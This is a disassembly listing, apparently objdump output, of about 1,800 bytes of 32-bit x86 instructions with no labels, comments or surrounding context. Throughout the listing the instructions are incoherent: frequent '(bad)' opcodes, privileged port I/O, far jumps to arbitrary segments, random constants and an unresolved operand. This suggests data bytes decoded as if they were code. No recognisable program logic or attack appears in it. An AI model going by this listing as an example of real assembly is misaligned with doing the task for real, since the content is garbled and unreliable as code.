  4102c8:	mov    esi,0x3aa0bd83
  4102cd:	bound  ebp,QWORD PTR [edx]
  4102cf:	ds cwde 
  4102d1:	mov    dh,0x7e
  4102d3:	adc    BYTE PTR [esi-0xb],bl
  4102d6:	add    DWORD PTR [ebp-0x39],0x17c5d62c
  4102dd:	pop    esi
  4102de:	out    dx,eax
  4102df:	inc    BYTE PTR [ebx-0x7abca066]
  4102e5:	jne    0x4102ad
  4102e7:	js     0x4102f7
  4102e9:	ins    BYTE PTR es:[edi],dx
  4102ea:	add    dl,ch
  4102ec:	(bad)  
  4102ee:	out    dx,al
  4102ef:	ret    0x9eb2
  4102f2:	and    BYTE PTR [edx+0x7b4a6153],ch
  4102f8:	cs out 0xc2,al
  4102fb:	jg     0x4102bb
  4102fd:	push   es
  4102fe:	fiadd  DWORD PTR [edx+esi*8+0x3c]
  410302:	es jmp 0xdfc7af32
  410308:	pop    esi
  410309:	das    
  41030a:	dec    ebx
  41030b:	xchg   esp,eax
  41030c:	enter  0xe383,0x6
  410310:	dec    esp
  410311:	popa   
  410312:	cs test eax,0x25167204
  410318:	mov    edi,0x8df0ee9d
  41031d:	enter  0x94c0,0x31
  410321:	dec    DWORD PTR [esi-0x58]
  410324:	add    DWORD PTR [esi+0x36],0xfffffff4
  410328:	int    0x6d
  41032a:	std    
  41032b:	cmp    DWORD PTR [esi+0x5e793a8e],edi
  410331:	mov    ebx,0x90fbb278
  410336:	ins    DWORD PTR es:[edi],dx
  410337:	dec    ecx
  410338:	xchg   ebx,eax
  410339:	pusha  
  41033a:	and    ah,ah
  41033c:	pop    edx
  41033d:	xor    BYTE PTR [ecx-0x4c],bl
  410340:	gs jmp 0x410331
  410343:	xor    edx,ebp
  410345:	xchg   edx,eax
  410346:	aaa    
  410347:	sub    ecx,DWORD PTR [eax+0x19]
  41034a:	mov    dl,0xa0
  41034c:	imul   ecx,ebp,0xffffffda
  41034f:	stos   BYTE PTR es:[edi],al
  410350:	(bad)  
  410351:	pop    esp
  410352:	scas   al,BYTE PTR es:[edi]
  410353:	xchg   eax,edi
  410355:	test   DWORD PTR [eax],esp
  410357:	sbb    DWORD PTR [edx+0x29b6eb2e],edi
  41035d:	ds (bad) 
  410360:	es test eax,0x64558f32
  410366:	sub    DWORD PTR [ecx],eax
  410368:	pop    esi
  410369:	xchg   ecx,eax
  41036a:	std    
  41036b:	or     al,0x7e
  41036d:	add    eax,0xa5ed5b3
  410372:	dec    esp
  410373:	pop    edx
  410374:	jo     0x410332
  410376:	mov    dl,0x46
  410378:	pusha  
  410379:	popa   
  41037a:	pop    esi
  41037b:	push   es
  41037c:	sbb    DWORD PTR [esi+eax*2+0x7e],eax
  410380:	or     bh,BYTE PTR [ecx]
  410382:	and    eax,0x80da6307
  410387:	leave  
  410388:	or     al,0xfb
  41038a:	sbb    BYTE PTR [ebx],dl
  41038c:	mov    WORD PTR [eax+0x5b],fs
  41038f:	pop    ebp
  410390:	call   0x145:0x19364dfb
  410397:	enter  0xa61a,0xed
  41039b:	sbb    cl,BYTE PTR [eax]
  41039d:	add    BYTE PTR [ebx],ah
  41039f:	xchg   BYTE PTR [esi+0x2a],ch
  4103a2:	jmp    0x4c38ae63
  4103a7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4103a8:	xor    ebx,DWORD PTR [ecx-0x38]
  4103ab:	add    al,BYTE PTR [esi+0x5e84db8c]
  4103b1:	xor    esi,DWORD PTR [esp-0x201a9d7]
  4103b8:	cmc    
  4103b9:	pusha  
  4103ba:	sti    
  4103bb:	mov    ds,WORD PTR [eax]
  4103bd:	bound  ebx,QWORD PTR [ebp-0x2e]
  4103c0:	mov    bh,0xba
  4103c2:	out    dx,al
  4103c3:	repz push edx
  4103c5:	retf   
  4103c6:	add    al,0xc0
  4103c8:	outs   dx,BYTE PTR ds:[esi]
  4103c9:	pop    DWORD PTR [esi]
  4103cb:	mov    eax,ds:0xba4e39ee
  4103d0:	pop    ebp
  4103d1:	lds    edx,FWORD PTR [eax]
  4103d3:	pop    si
  4103d5:	adc    BYTE PTR [edx-0x767465bf],0x2d
  4103dc:	xchg   edi,eax
  4103dd:	pop    ebp
  4103de:	inc    edx
  4103df:	push   ss
  4103e0:	mov    ch,0xf9
  4103e2:	cli    
  4103e3:	pushf  
  4103e4:	outs   dx,DWORD PTR ds:[esi]
  4103e5:	pop    esi
  4103e6:	dec    esi
  4103e7:	jp     0x410465
  4103e9:	fs push esi
  4103eb:	mov    ebx,0x64c2c552
  4103f0:	push   ds
  4103f1:	out    dx,al
  4103f2:	add    dl,al
  4103f4:	sub    BYTE PTR [ecx],dl
  4103f6:	xor    DWORD PTR [ebx+0x580532c],ebp
  4103fc:	popf   
  4103fd:	shr    DWORD PTR [ebp+0x78],1
  410400:	pop    ds
  410401:	(bad)  
  410402:	fldcw  WORD PTR [ebx+0x77a605cf]
  410408:	or     esi,DWORD PTR [ebp+0x7ce27ff0]
  41040e:	mov    ecx,0x6fbf783e
  410413:	fnsave [esi]
  410415:	pop    DWORD PTR [ebx+0x41]
  410418:	mov    esi,0x4a19569
  41041d:	int    0x44
  41041f:	in     eax,dx
  410420:	icebp  
  410421:	inc    ecx
  410422:	sub    ecx,DWORD PTR [esi+0x5587a064]
  410428:	mov    WORD PTR [eax-0x41],fs
  41042b:	scas   al,BYTE PTR es:[edi]
  41042c:	xchg   ecx,eax
  41042d:	push   esp
  41042e:	cwde   
  41042f:	mov    eax,ds:0xd91dd0ed
  410434:	dec    ebp
  410435:	in     al,0xa4
  410437:	stos   BYTE PTR es:[edi],al
  410438:	pop    esi
  410439:	add    DWORD PTR [eax-0x59],ebx
  41043c:	popa   
  41043d:	inc    esp
  41043e:	jne    0x410497
  410440:	dec    edi
  410441:	popa   
  410442:	aad    0x62
  410444:	test   BYTE PTR [eax-0x2e3657d2],dh
  41044a:	jmp    0x410412
  41044c:	test   eax,0x3a6f56f7
  410451:	mov    ecx,0x60ccb18e
  410456:	dec    esp
  410457:	sbb    al,BYTE PTR [ebx-0x76e9a26]
  41045d:	in     eax,0xee
  41045f:	cmp    BYTE PTR [ecx+0x3],dl
  410462:	out    dx,eax
  410463:	push   ebp
  410464:	dec    ecx
  410465:	leave  
  410466:	int3   
  410467:	mov    al,ds:0x25128b56
  41046c:	imul   eax,DWORD PTR [esi+eax*8-0x25],0x7882a55e
  410474:	pusha  
  410475:	pop    es
  410476:	sub    dl,bl
  410478:	dec    esp
  410479:	fs sti 
  41047b:	jp     0x41045b
  41047d:	push   ss
  41047e:	mov    bh,0xc0
  410480:	jge    0x410457
  410482:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410483:	ficom  WORD PTR [esi-0x9]
  410486:	shl    eax,0x1a
  410489:	(bad)  
  41048a:	(bad)  
  41048b:	mov    eax,ds:0x4cd8739
  410490:	sbb    esi,edi
  410492:	das    
  410493:	scas   eax,DWORD PTR es:[edi]
  410494:	pop    esi
  410495:	leave  
  410496:	xor    esi,eax
  410498:	jo     0x4104cd
  41049a:	sti    
  41049b:	lock add al,0x5f
  41049e:	cmp    BYTE PTR [esi-0x405ea938],0x1e
  4104a5:	fistp  QWORD PTR [eax+eiz*2+0x3ffaa35d]
  4104ac:	dec    esi
  4104ad:	scas   al,BYTE PTR es:[edi]
  4104ae:	fs cmp dh,0xaa
  4104b2:	out    0x7a,al
  4104b4:	cmp    esp,DWORD PTR [ecx-0xc]
  4104b7:	add    al,0xea
  4104b9:	push   edi
  4104ba:	test   al,0x79
  4104bc:	pop    eax
  4104bd:	into   
  4104be:	out    dx,al
  4104bf:	ja     0x410457
  4104c1:	fidiv  DWORD PTR [esi]
  4104c3:	sub    ah,al
  4104c5:	pop    edx
  4104c6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4104c7:	mov    eax,ds:0xec49eda8
  4104cc:	mov    ebx,DWORD PTR [ebp-0x66837af9]
  4104d2:	out    dx,al
  4104d3:	ss jne 0x4104e1
  4104d6:	jp     0x4104d3
  4104d8:	jbe    0x410519
  4104da:	(bad)  
  4104db:	mov    al,ds:0x2abd1f04
  4104e0:	rcr    BYTE PTR [ecx-0x45],cl
  4104e3:	retf   0xb32
  4104e6:	shl    DWORD PTR [eax+0x6122f070],1
  4104ec:	xchg   BYTE PTR [ebp+0x5c75a429],bl
  4104f2:	inc    esp
  4104f3:	jno    0x41053f
  4104f5:	rol    DWORD PTR [esi-0x167d9bd8],0xe6
  4104fc:	or     DWORD PTR [edi],esp
  4104fe:	(bad)
  410501:	sub    dl,BYTE PTR [ebx-0x6dacb652]
  410507:	cmp    ebp,edx
  410509:	bound  edi,QWORD PTR [edi-0x7f2313dd]
  41050f:	into   
  410510:	xchg   esi,eax
  410511:	xchg   ebp,eax
  410512:	inc    esi
  410513:	cmp    al,0x5e
  410515:	mov    al,ds:0x96a5a5b5
  41051a:	sbb    DWORD PTR ds:0x2df05982,ecx
  410520:	repz bnd je 0x410565
  410524:	cmps   BYTE PTR es:[esi],BYTE PTR es:[edi]
  410526:	or     ch,BYTE PTR [ebx+0x5f]
  410529:	stos   DWORD PTR es:[edi],eax
  41052a:	xchg   ebp,eax
  41052b:	nop
  41052c:	pop    eax
  41052d:	outs   dx,BYTE PTR ds:[esi]
  41052e:	xor    BYTE PTR [eax-0x4c],dh
  410531:	loopne 0x410535
  410533:	jbe    0x41057a
  410535:	(bad)  
  410536:	int    0xa1
  410538:	jmp    0x5396825e
  41053d:	push   ebx
  41053e:	adc    DWORD PTR [ecx-0x79],esi
  410541:	retf   
  410542:	out    dx,al
  410543:	jl     0x410539
  410545:	lea    edx,[esi-0x36]
  410548:	retf   0xc353
  41054b:	call   0x706606
  410550:	out    0x2d,al
  410552:	pop    edx
  410553:	aam    0x9
  410555:	xor    esi,ebp
  410557:	push   edi
  410558:	jl     0x410530
  41055a:	jmp    0x410566
  41055c:	stos   DWORD PTR es:[edi],eax
  41055d:	pop    edx
  41055e:	sbb    eax,0x77eccea1
  410563:	les    ebp,FWORD PTR [esi+esi*2-0x3a]
  410567:	or     eax,0x4e3bb765
  41056c:	lods   eax,DWORD PTR ds:[esi]
  41056d:	loopne 0x4105d3
  41056f:	mov    dh,0xa9
  410571:	ins    BYTE PTR es:[edi],dx
  410572:	aad    0xa0
  410574:	push   es
  410575:	dec    edi
  410576:	imul   eax,eax,0xe0a0d253
  41057c:	pop    ebx
  41057d:	mov    esp,0x9d3be49b
  410582:	pop    esi
  410583:	mov    ebx,0xa18754c7
  410588:	inc    eax
  410589:	push   ebx
  41058a:	and    al,0xf0
  41058c:	xchg   DWORD PTR [ebp+0x6e5ed43b],edx
  410592:	mov    ds,ebp
  410594:	jae    0x4105f1
  410596:	cdq    
  410597:	jbe    0x4105b2
  410599:	pop    edx
  41059a:	fwait
  41059b:	and    DWORD PTR [eax],esp
  41059d:	fwait
  41059e:	pop    ds
  41059f:	adc    DWORD PTR [esp+edi*1],esp
  4105a2:	inc    edi
  4105a3:	sub    BYTE PTR [esi+0x5f],bl
  4105a6:	inc    ebp
  4105a7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4105a8:	mov    DWORD PTR [edi+0x274404f5],esp
  4105ae:	xchg   BYTE PTR [eax-0x67f301c2],ch
  4105b4:	adc    bh,ah
  4105b6:	test   BYTE PTR [ecx],ah
  4105b8:	call   0x2d71:0x52c4f0f1
  4105bf:	pop    ecx
  4105c0:	pop    esi
  4105c1:	add    eax,ebp
  4105c3:	or     eax,0xa4820d6e
  4105c8:	jae    0x41057c
  4105ca:	jmp    0xb51:0x2e92aba5
  4105d1:	push   ebp
  4105d2:	in     eax,dx
  4105d3:	ret    0x663e
  4105d6:	push   ds
  4105d7:	test   DWORD PTR [ebp-0x539a14a],eax
  4105dd:	pusha  
  4105de:	cs inc esp
  4105e0:	call   0xee02:0x2636b64
  4105e7:	add    ah,BYTE PTR [edx+0x3a]
  4105ea:	out    0x71,al
  4105ec:	sbb    al,0xdd
  4105ee:	(bad)  
  4105ef:	mov    al,ds:0xf78047fa
  4105f4:	and    eax,0x5ee4f5e8
  4105f9:	es pop ebx
  4105fb:	dec    eax
  4105fc:	and    dh,al
  4105fe:	popf   
  4105ff:	(bad)  
  410601:	pusha  
  410602:	push   esp
  410603:	imul   ebp,DWORD PTR [eax],0x33
  410606:	xchg   ecx,eax
  410607:	test   eax,0x9e4e4bf4
  41060c:	push   esp
  41060d:	mov    ebp,0x7c5fe646
  410612:	adc    ebp,DWORD PTR [ebp-0x53b14867]
  410618:	ds jmp 0x732f:0xd0e9a2c4
  410620:	xchg   esp,eax
  410621:	ja     0x410651
  410623:	inc    eax
  410624:	add    esp,DWORD PTR [ebx]
  410626:	pop    esp
  410627:	mov    esp,0x5202e95e
  41062c:	(bad)  
  41062d:	mov    ecx,0x2ecf3631
  410632:	mov    ds:0xc016a7a1,eax
  410637:	sub    bl,BYTE PTR [ecx+0x3a]
  41063a:	and    edi,edx
  41063c:	pop    edi
  41063d:	mov    DWORD PTR [ebp+0x24f036fb],ebp
  410643:	dec    ecx
  410644:	mov    bl,0xd8
  410646:	stos   BYTE PTR es:[edi],al
  410647:	mov    al,ds:0x5c00be0b
  41064c:	fiadd  WORD PTR [eax]
  41064e:	xchg   ebx,eax
  41064f:	sub    eax,0x72dd9a5f
  410654:	dec    esi
  410655:	retf   
  410656:	adc    ebx,DWORD PTR [ecx]
  410658:	clc    
  410659:	push   0xcdaaa25e
  41065e:	stos   DWORD PTR es:[edi],eax
  41065f:	cmp    esp,DWORD PTR [edx]
  410661:	ja     0x410671
  410663:	dec    esi
  410664:	sub    dh,BYTE PTR [esi+edi*4-0x12680400]
  41066b:	lock pop esp
  41066d:	je     0x4106ce
  41066f:	and    DWORD PTR [esi-0x6a],esi
  410672:	cmp    eax,0x4d158e73
  410677:	jae    0x410661
  410679:	adc    al,0xed
  41067b:	push   edx
  41067c:	pop    esi
  41067d:	push   esi
  41067e:	lahf   
  41067f:	cwde   
  410680:	mov    ds:0x5efb5590,al
  410685:	adc    BYTE PTR [ecx],bh
  410687:	clc    
  410688:	mov    dl,BYTE PTR [ecx]
  41068a:	jb     0x410650
  41068c:	std    
  41068d:	pusha  
  41068e:	dec    esp
  41068f:	xchg   ebp,eax
  410690:	ja     0x4106e2
  410692:	fdivr  QWORD PTR [esi]
  410694:	test   al,0xf4
  410696:	repz mov al,0xe6
  410699:	test   BYTE PTR [ecx+eiz*4],ch
  41069c:	mov    edi,0xee876492
  4106a1:	pusha  
  4106a2:	je     0x41067e
  4106a4:	or     bh,cl
  4106a6:	pop    ds
  4106a7:	mov    edi,0xbaee4ced
  4106ac:	jmp    0xecd1ac6f
  4106b1:	int3   
  4106b2:	or     ah,BYTE PTR [ecx+0x30a094df]
  4106b8:	fist   DWORD PTR [ebp+0x635e0536]
  4106be:	ins    DWORD PTR es:[edi],dx
  4106bf:	leave  
  4106c0:	(bad)  
  4106c1:	sub    bh,bh
  4106c3:	outs   dx,DWORD PTR ds:[esi]
  4106c4:	push   esp
  4106c5:	mov    cl,0x7e
  4106c7:	mov    eax,ds:0xd3b3d66c
  4106cc:	xor    edx,ebx
  4106ce:	or     ecx,edi
  4106d0:	inc    edx
  4106d1:	cdq    
  4106d2:	leave  
  4106d3:	fcomp  DWORD PTR [ebx-0x7f]
  4106d6:	cwde   
  4106d7:	jle    0x4106e8
  4106d9:	imul   ebp,DWORD PTR cs:[ecx],0xa16095d3
  4106e0:	ins    BYTE PTR es:[edi],dx
  4106e1:	cmp    DWORD PTR [ecx+0x3e],ebx
  4106e4:	sbb    al,BYTE PTR [esi]
  4106e6:	jno    0x4106cb
  4106e8:	pop    esi
  4106e9:	sub    esp,esi
  4106eb:	mov    dl,0x15
  4106ed:	or     eax,0x78de40f8
  4106f2:	push   edi
  4106f3:	xchg   DWORD PTR [eax+eiz*2+0x7],ebp
  4106f7:	xor    dl,BYTE PTR [ebx-0x6c]
  4106fa:	mov    cl,0xe9
  4106fc:	inc    ebx
  4106fd:	add    bh,ch
  4106ff:	add    ebp,eax
  410701:	test   al,0x97
  410703:	xor    eax,edi
  410705:	jnp    0x4106f3
  410707:	(bad)  
  410708:	lock sbb al,0xd7
  41070b:	mov    al,ds:0x182e8a21
  410710:	mov    dh,BYTE PTR [edi-0x12]
  410713:	scas   al,BYTE PTR es:[edi]
  410714:	retf   0x6023
  410717:	dec    eax
  410718:	bound  edx,QWORD PTR [edx-0x16]
  41071b:	mov    al,ds:0xf00db7b7
  410720:	std    
  410721:	adc    BYTE PTR [ebx+0x98a5b45],0xa
  410728:	cwde   
  410729:	retf   
  41072a:	dec    esi
  41072b:	fstp   st(4)
  41072d:	dec    ecx
  41072e:	pop    ds
  41072f:	mov    al,ds:0xbaa387b0
  410734:	(bad)  
  410735:	test   eax,0x52bd3eb6
  41073a:	out    dx,al
  41073b:	add    DWORD PTR [esi+0x62e9ea7f],ebx
  410741:	cmp    esp,DWORD PTR [eax-0xa88a05f]
  410747:	lods   eax,DWORD PTR ds:[esi]
  410748:	stos   BYTE PTR es:[edi],al
  410749:	mov    esi,0x53465b4
  41074e:	test   al,0xa0
  410750:	add    DWORD PTR [ebx+0x79c1b9be],ebp
  410756:	mov    cl,0xa0
  410758:	xchg   DWORD PTR [edx+0x7e],ecx
  41075b:	push   es
  41075c:	mov    esi,0x5e7f3248
  410761:	fwait
  410762:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410763:	idiv   bl
  410765:	jno    0x4107b9
  410767:	pop    ebx
  410768:	es pop esi
  41076a:	mov    DWORD PTR [edx-0x691dd4a5],ebx
  410770:	jle    0x4107c3
  410772:	jno    0x4107ce
  410774:	adc    BYTE PTR [esi-0x12],0x8b
  410778:	pop    es
  410779:	retf   
  41077a:	in     al,dx
  41077b:	mov    eax,0xa11b8826
  410780:	aaa    
  410781:	inc    ebp
  410782:	xor    bl,al
  410784:	cmp    al,0x74
  410786:	push   0xffffffd5
  410788:	pop    esi
  410789:	test   DWORD PTR [eax+0x42],esi
  41078c:	lahf   
  41078d:	xchg   ebp,eax
  41078e:	dec    edx
  41078f:	popa   
  410790:	hlt    
  410791:	pusha  
  410792:	iret   
  410793:	cmp    eax,0xf477ee14
  410798:	popa   
  410799:	call   0xe7361a8c
  41079e:	movaps xmm0,XMMWORD PTR [edi+0x19]
  4107a2:	or     BYTE PTR [ebp+0x615c1fee],0xe4
  4107a9:	clc    
  4107aa:	sbb    eax,0x24cc8176
  4107af:	cmc    
  4107b0:	xchg   edi,eax
  4107b1:	loopne 0x41074e
  4107b3:	add    BYTE PTR [esi-0x4f],0xc3
  4107b7:	loopne 0x41075f
  4107b9:	pop    ecx
  4107ba:	outs   dx,BYTE PTR ds:[esi]
  4107bb:	jl     0x57f2a07a
  4107c1:	imul   esi,DWORD PTR [edi-0x50],0x53
  4107c5:	lahf   
  4107c6:	inc    edi
  4107c8:	sar    esp,1
  4107ca:	adc    dl,bh
  4107cc:	pop    ebx
  4107cd:	xor    DWORD PTR [ecx],eax
  4107cf:	add    DWORD PTR [esi-0xe62e983],edi
  4107d5:	pusha  
  4107d6:	mov    eax,ds:0x1c3e7bdd
  4107db:	jl     0x41085b
  4107dd:	cli    
  4107de:	out    0x7a,eax
  4107e0:	cmc    
  4107e1:	xchg   ebx,eax
  4107e2:	mov    eax,0xeccbbe3a
  4107e7:	(bad)  
  4107e8:	retf   0xb159
  4107eb:	cmp    eax,0x24d4fde1
  4107f0:	in     al,0xd9
  4107f2:	adc    esp,DWORD PTR [ecx]
  4107f4:	push   edi
  4107f5:	push   ebp
  4107f6:	mov    bl,0x3
  4107f8:	pop    esi
  4107f9:	sub    ebx,DWORD PTR [ebx]
  4107fb:	inc    ebx
  4107fc:	stc    
  4107fd:	pop    esp
  4107fe:	cmp    ah,BYTE PTR [ebx+eiz*2+0x5db53b65]
  410805:	imul   edi,eax,0x2eeb7af1
  41080b:	jp     0x410881
  41080d:	cmp    BYTE PTR [ebx-0x5328a422],0xd4
  410814:	jmp    0x4107ed
  410816:	cs or  dh,cl
  410819:	push   ebp
  41081a:	adc    DWORD PTR [ebx+0x1beefac0],ebp
  410820:	int    0xa9
  410822:	jbe    0x4107cb
  410824:	(bad)  
  410825:	xchg   edi,eax
  410826:	out    dx,al
  410827:	cli    
  410828:	push   es
  410829:	push   ebx
  41082a:	jp     0x410815
  41082c:	mov    eax,0x65a0ed68
  410831:	sbb    BYTE PTR [edi+0x24],al
  410834:	data16 and cl,BYTE PTR ds:0x583c5bac
  41083b:	stc    
  41083c:	mov    esi,0xffb56e41
  410841:	retf   
  410842:	jo     0x4107e5
  410844:	jb     0x410822
  410846:	xchg   ebp,eax
  410847:	xchg   edx,eax
  410848:	shl    BYTE PTR [edx-0x479b02df],0xa
  41084f:	jnp    0x4107ff
  410851:	inc    eax
  410852:	or     esi,DWORD PTR [edx+ecx*8]
  410855:	jo     0x4108a3
  410857:	mov    eax,ds:0xaf7552fa
  41085c:	add    BYTE PTR ss:[edx],dh
  41085f:	dec    esp
  410860:	pop    esi
  410861:	jns    0x4108a4
  410863:	aas    
  410864:	call   DWORD PTR [esi-0x34]
  410867:	(bad)  
  410868:	jb     0x4108ca
  41086a:	(bad)  
  41086b:	sti    
  41086c:	mov    dh,0xc8
  41086e:	js     0x41080d
  410870:	(bad)  
  410871:	fs out dx,al
  410873:	mov    DWORD PTR [esp+eiz*4],ebx
  410876:	and    dl,0x4
  410879:	mov    ebx,0x23f7a27d
  41087e:	shr    BYTE PTR [ecx-0x3d944859],cl
  410884:	popf   
  410885:	jo     0x410879
  410887:	leave  
  410888:	mov    BYTE PTR [edx+0x6124c222],dh
  41088e:	inc    ecx
  41088f:	add    ecx,eax
  410891:	push   cs
  410892:	aas    
  410893:	xor    esi,ebp
  410895:	pusha  
  410896:	das    
  410897:	je     0x4108bb
  410899:	inc    esp
  41089a:	pushf  
  41089b:	imul   DWORD PTR [ecx+0x7a]
  41089e:	out    dx,al
  41089f:	in     al,0x9f
  4108a1:	mov    DWORD PTR [eax-0x7b],esp
  4108a4:	cmp    eax,0x7da16de8
  4108a9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4108aa:	jmp    0x5ef1:0xfa08eaf0
  4108b1:	adc    cl,cl
  4108b3:	les    esp,FWORD PTR [esi+0x5ce97df6]
  4108b9:	popa   
  4108ba:	pop    esp
  4108bb:	jmp    FWORD PTR [edi-0x4f]
  4108be:	sub    al,dh
  4108c0:	sbb    DWORD PTR [esi-0x12],ecx
  4108c3:	clc    
  4108c4:	imul   eax,DWORD PTR [eax-0x6d],0xffffff93
  4108c8:	ins    BYTE PTR es:[edi],dx
  4108c9:	inc    edi
  4108ca:	dec    ebp
  4108cb:	mov    eax,ds:0x9eef5b20
  4108d0:	add    eax,0x7a22546d
  4108d5:	ds data16 in al,dx
  4108d8:	pop    esi
  4108d9:	test   al,0xaa
  4108db:	outs   dx,DWORD PTR ds:[esi]
  4108dc:	bound  esi,QWORD PTR [eax-0x22]
  4108df:	retf   
  4108e0:	adc    DWORD PTR [ebx-0x27],eax
  4108e3:	mov    bh,BYTE PTR [ecx+edx*1-0x4d]
  4108e7:	out    dx,al
  4108e8:	sahf   
  4108e9:	adc    BYTE PTR [edx],ch
  4108eb:	(bad)  
  4108ec:	mov    dl,0x70
  4108ee:	mov    esi,0xee1280cf
  4108f3:	mov    esp,0xa372f3d9
  4108f8:	cmp    al,0x99
  4108fa:	nop
  4108fb:	stos   BYTE PTR es:[edi],al
  4108fc:	fcom   DWORD PTR [ecx-0x7e]
  4108ff:	arpl   cx,bp
  410901:	pusha  
  410902:	test   DWORD PTR [ecx+0x36cc0b2f],esi
  410908:	pop    esi
  410909:	jbe    0x410911
  41090b:	sbb    esp,DWORD PTR [eax-0x44]
  41090e:	sar    DWORD PTR [eax],1
  410910:	(bad)  
  410911:	pusha  
  410912:	sbb    ah,ch
  410914:	fcmove st,st(7)
  410916:	pusha  
  410917:	rcr    DWORD PTR [edx],cl
  410919:	and    ebx,ebp
  41091b:	mov    esi,DWORD PTR [bx+di+0x1ef3]
  410920:	test   eax,esi
  410922:	dec    edx
  410923:	inc    edx
  410924:	or     eax,0x54d6a861
  410929:	sub    dl,cl
  41092b:	nop
  41092c:	push   eax
  41092d:	pop    edi
  41092e:	add    al,BYTE PTR [ecx+ebp*1+0x5a29aee4]
  410935:	xchg   dh,al
  410937:	cmp    ch,BYTE PTR [ebp-0x5c]
  41093a:	sbb    BYTE PTR [ecx-0x3992ad73],ah
  410940:	mov    ah,0xdb
  410942:	inc    ebp
  410943:	mov    esi,0xd6a64464
  410948:	push   es
  410949:	add    DWORD PTR [edx+0x4f],esi
  41094c:	cwde   
  41094d:	test   DWORD PTR ds:0xf81a729a,eax
  410953:	fcom   QWORD PTR [esi+0x5e76db6f]
  410959:	jbe    0x4108e2
  41095b:	fldcw  WORD PTR [esi+0x48]
  41095e:	sub    DWORD PTR [eax-0x13],ebx
  410961:	inc    ebx
  410962:	xchg   esi,eax
  410963:	aas    
  410964:	sub    BYTE PTR [ebx-0x57e161c2],dl
  41096a:	(bad)  
  41096b:	(bad)  
  41096d:	fldpi  
  41096f:	jne    0x4108fa
  410971:	mov    esp,0xd993c011
  410976:	ins    DWORD PTR es:[edi],dx
  410977:	jb     0x410911
  410979:	and    eax,0x21b9225e
  41097e:	add    BYTE PTR [ecx+0x304bb1d7],ah
  410984:	pcmpgtb mm0,QWORD PTR [edi+eiz*1-0x77cb22a2]
  41098c:	inc    ecx
  41098d:	daa    
  41098e:	cmp    al,0x58
  410990:	push   ecx
  410991:	bound  ebx,QWORD PTR [edx+0x70cfe4e4]
  410997:	pop    ss
  410998:	mov    esi,0xc31b4d7b
  41099d:	and    DWORD PTR [esi+esi*1+0x5e],0xbb3add59
  4109a5:	push   edx
  4109a6:	mov    ebp,0x1c424bc3
  4109ab:	loop   0x410994
  4109ad:	loopne 0x410a27
  4109af:	in     eax,dx
  4109b0:	pushf  
  4109b1:	ja     0x4109c3
  4109b3:	and    bl,BYTE PTR [ebp+0x52]
  4109b6:	data16 mov ah,0x62
  4109b9:	adc    DWORD PTR [edx],eax
  4109bb:	push   esi
  4109bc:	call   0x44db:0x92a12216
  4109c3:	mov    ebx,?
  4109c5:	rcr    DWORD PTR [esi-0x66],cl
  4109c8:	pop    ebx
  4109c9:	cld    
  4109ca:	push   edx
  4109cb:	daa    
  4109cc:	out    dx,eax
  4109cd:	(bad)  
  4109ce:	int    0xf5
  4109d0:	in     eax,dx
  4109d1:	mov    esi,0xbe83210e
  4109d6:	xchg   ecx,eax
  4109d7:	mov    eax,ds:0x24a752f9
  4109dc:	mov    edi,0x6357f849
  4109e1:	out    dx,al
  4109e2:	push   ebp
  4109e3:	inc    eax
  4109e4:	push   edi
  4109e5:	inc    ecx
  4109e6:	xchg   ebp,eax
  4109e7:	xlat   BYTE PTR fs:[ebx]
  4109e9:	retf   0xa16e
  4109ec:	or     bl,BYTE PTR [ecx+0x5a]
  4109ef:	icebp  
  4109f0:	ja     0x4109da
  4109f2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4109f3:	ja     0x410a53
  4109f5:	(bad)  
  4109f6:	jl     0x4109f2
  4109f8:	das    
  4109f9:	jmp    0x41099f
  4109fb:	les    edi,FWORD PTR [edx+0x1d024e5f]
  410a01:	test   al,0x94
  410a03:	test   al,ch
  410a05:	test   al,0x73
  410a07:	add    DWORD PTR [edx-0x39],ebx
  410a0a:	pop    es
  410a0b:	sub    BYTE PTR [ecx],al
  410a0d:	push   esi
  410a0e:	cs adc eax,0xa1a5f156
  410a14:	adc    bh,BYTE PTR [ebx]
  410a16:	fist   WORD PTR [ebx-0x2f]
  410a19:	sahf   
  410a1a:	sbb    DWORD PTR [ebx-0x761f2da2],edi
  410a20:	inc    eax
  410a21:	sbb    al,0x2f
  410a23:	mov    ch,0x13
  410a25:	fs pop eax
  410a27:	(bad)  
  410a29:	pusha  
  410a2a:	fmul   DWORD PTR [ebx+0x5d]
  410a2d:	jge    0x410a51
  410a2f:	rol    DWORD PTR [ecx],0xf3
  410a32:	out    dx,al
  410a33:	addr16 mov eax,ds:0x3794
  410a37:	loop   0x410a3b
  410a39:	push   eax
  410a3a:	mov    al,ds:0x9e611587
  410a3f:	inc    eax
  410a40:	lds    eax,FWORD PTR [ebp+0x79]
  410a43:	je     0x410a1e
  410a45:	ins    BYTE PTR es:[edi],dx
  410a46:	out    dx,al
  410a47:	cmp    cl,BYTE PTR [esi+0x45]
  410a4a:	jae    0x410aa8
  410a4c:	imul   edx,edx,0x77d8a164
  410a52:	fldz   
  410a54:	inc    edx
  410a55:	dec    ecx
  410a56:	push   ebp
  410a57:	iret   
  410a58:	pop    esi
  410a59:	nop
  410a5a:	dec    esi
  410a5b:	sahf   
  410a5c:	sti    
  410a5d:	push   edx
  410a5e:	outs   dx,DWORD PTR ds:[esi]
  410a5f:	sbb    dh,BYTE PTR [edi]
  410a61:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410a62:	mov    WORD PTR [eax+eiz*2-0x214cb67a],ds
  410a69:	xor    al,0xd5
  410a6b:	mov    ch,0xff
  410a6d:	and    al,0xdc
  410a6f:	cmp    al,0x22
  410a71:	fldcw  WORD PTR [edi]
  410a73:	(bad)  
  410a74:	dec    edi
  410a75:	push   es
  410a76:	out    dx,al
  410a77:	sub    BYTE PTR [eax-0x7b5a7ed9],0x60
  410a7e:	cld    
  410a7f:	dec    edx
  410a80:	jbe    0x410a5e
  410a82:	jp     0x410a9c
  410a84:	ror    BYTE PTR [ebx-0x12],cl
  410a87:	inc    esp
  410a88:	mov    BYTE PTR ds:0x70f52668,dh
  410a8e:	ins    BYTE PTR es:[edi],dx
  410a8f:	hlt    
  410a90:	(bad)  
